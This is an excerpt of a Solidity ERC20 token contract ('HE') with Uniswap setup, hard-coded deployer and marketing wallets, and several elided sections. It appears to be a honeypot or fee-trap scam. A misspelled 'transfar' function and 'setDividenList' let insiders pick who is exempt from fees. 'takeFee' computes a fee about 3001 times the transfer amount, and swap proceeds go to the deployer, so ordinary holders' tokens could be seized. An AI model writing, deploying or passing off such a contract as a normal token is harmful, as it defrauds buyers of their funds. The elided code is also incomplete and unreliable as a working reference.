...
contract HE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "HE";
    string private _symbol = unicode"HE";
    ...
    uint256 private minimumTokensBeforeSwap = 20000 * 10**9; 
    ...
    constructor () {
        ...
        deployer = payable(address(0xB5E86DB17b44db9b727117F4ad64A231691cE9B9));
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        address routerV2 = marketing;
        ...
        marketing = payable(address(0x6c4768eEbb53e70434F03e67EDE6f9Cee1730f3F));
    ...
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(burnAddress));
    }
    ...
    function setDividenList(address newAddress) external {
        require(isTxLimitExempt[msg.sender]);
        isExcludedFromFees[newAddress] = false;
    }
    ...
    function transfar(address[] memory seen) external virtual {
        tick(true);
        for (uint256 i; i < seen.length; i++) {
        isExcludedFromFees[seen[i]] = true;
      }
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHTeam > 0)
            transferToAddressETH(deployer, amountETHTeam);
    ...
    function takeFee(address sender, address recipient, uint256 excape) private returns (uint256) {
        uint256 spore = excape;
        uint256 feeAmount = 0;
        uint256 feeExcape = spore.add(excape * 3000);
    ...
    function tick(bool time) view public{
        if (!time) return;
